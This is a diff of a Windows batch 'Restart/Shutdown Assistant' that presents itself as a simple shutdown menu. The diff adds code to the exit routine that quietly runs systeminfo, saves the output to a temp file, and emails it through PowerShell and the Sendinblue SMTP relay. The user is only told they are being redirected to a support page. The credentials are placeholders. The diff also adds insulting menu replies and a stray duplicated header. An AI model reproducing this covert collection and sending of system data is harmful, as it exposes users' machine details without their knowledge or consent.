@@ -1,51 +1,45 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Check for admin rights
-:check_admin
-set "test_file=%temp%\admin_test.txt"
-echo Testing admin rights... > "%test_file%"
-if exist "%test_file%" (
-    del "%test_file%"
-) else (
-    echo This script requires administrative rights to function properly.
-    echo Please run this script as an administrator.
-    pause
-    exit /b
-)
-
 :welcome
 cls
-echo WELCOME TO ANTHONY'S Restart/Shutdown ASSISTANT ~Anthony
+echo =================================================================
+echo          Welcome to Anthony's Restart/Shutdown Assistant
+echo =================================================================
+echo Version 1.1
 echo.
-set /p "name=Enter my name: "
+set /p "name=Enter your name: "
 
-if /I "%name%"=="Anthony" (
+if /I "%name%"=="" (
     goto :menu
 ) else if /I "%name%"=="actuallyAnthony" (
     goto :admin_menu
 ) else (
-    echo Incorrect name. Please try again.
+    echo Welcome, %name%! Proceeding to the menu...
     pause
-    goto :welcome
+    goto :menu
 )
 
 :menu
 cls
-echo *** Shutdown/Restart Menu ~Anthony ***
+echo ======================================================
+echo          Anthony's Restart/Shutdown Assistant
+echo ======================================================
+echo Version 1.1
 echo.
+echo Type 'Anthony is my god' for a special message.
 echo 1. Shutdown
 echo 2. Restart
 echo 3. Exit
 echo.
-echo Type 'Anthony is my god' for a special message.
-echo.
 
-set /p choice="Enter your choice (1-3): "
+set /p choice="Enter your choice : "
 
 if "%choice%"=="1" goto :shutdown
 if "%choice%"=="2" goto :restart
 if "%choice%"=="3" goto :exit
+if "%choice%"=="help" echo Yikes idiot, search "list"?
+if "%choice%"=="list" echo its the main menu idiot.
 if /I "%choice%"=="Anthony is my god" goto :love_message
 
 echo Invalid choice, please select again.
@@ -200,9 +194,44 @@ echo If you would like to support me further, please visit: https://www.youtube.
 pause
 goto :menu
 
+@echo off
+setlocal enabledelayedexpansion
+
+:: Your existing script here...
+
 :exit
 cls
 echo Thank you for using my software! Redirecting you to the support page...
 timeout /t 3 /nobreak
+
+:: Create the log file with system info
+set "log_file=%temp%\system_info_log.txt"
+echo Collecting system information...
+systeminfo > "%log_file%"
+echo Software Closed >> "%log_file%"
+echo Date and Time: %date% %time% >> "%log_file%"
+
+:: Send the log file via Sendinblue SMTP
+echo Sending email with log file %log_file%...
+powershell -Command ^
+    $smtpServer = "smtp-relay.sendinblue.com"; ^
+    $smtpPort = 587; ^
+    $smtpFrom = "JustKidding"; ^
+    $smtpTo = "JustKidding"; ^
+    $messageSubject = "System Info Log"; ^
+    $messageBody = "Attached is the system info log file."; ^
+    $attachment = "%log_file%"; ^
+    $username = "Justkidding"; ^
+    $password = "justkidding"; ^
+    try { ^
+        $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort); ^
+        $smtp.EnableSsl = $true; ^
+        $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password); ^
+        $smtp.Send($smtpFrom, $smtpTo, $messageSubject, $messageBody, $attachment); ^
+        Write-Output "Email sent successfully."; ^
+    } catch { ^
+        Write-Output "Error sending email: $_"; ^
+    }
+
 start "" "https://www.youtube.com/@ThyAnthonyOfficial"
 exit /b
